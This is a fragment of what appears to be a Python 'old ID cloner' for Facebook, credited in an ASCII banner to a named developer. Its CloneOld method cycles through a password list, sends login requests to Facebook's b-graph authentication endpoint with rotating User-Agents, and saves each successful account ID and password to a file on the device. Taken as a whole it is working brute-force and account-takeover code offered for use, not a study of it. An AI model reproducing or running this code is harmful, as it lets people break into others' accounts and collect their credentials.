...
.-,_| |_| | \\| |/__U| |_| |\\ 
 \\_)-\\___/   |_____||____/ u 
     ...
     (__)   (_")("_)(__)_)   
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{M}DEVELOPER  : SONU (THARKII MUNDA)
{M}GITHUB     : tharkimunda
{M}FEATURE    : OLD ID CLONER
{M}VERSION    : TEST
{M}-------------------------------
        ''')
    ...
    def CloneOld(self, ids, passlist):
        """محاولة تسجيل الدخول باستخدام المعرفات."""
        sys.stdout.write(f'\r{P}Processing {self.loop} | OK: {len(self.oks)} | CP: {len(self.cps)}')
        sys.stdout.flush()
        for pas in passlist:
            try:
                data = {
                ...
                headers = {
                    ...
                    'User-Agent': random.choice(self.user_agents)  # اختيار User-Agent عشوائي
                }
                response = requests.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers).json()

                if 'access_token' in response:
                    print(f'\n{H}OK: {ids} | {pas}')
                    open('/sdcard/OK.txt', 'a').write(f'{ids}|{pas}\n')
                    self.oks.append(ids)
                    break
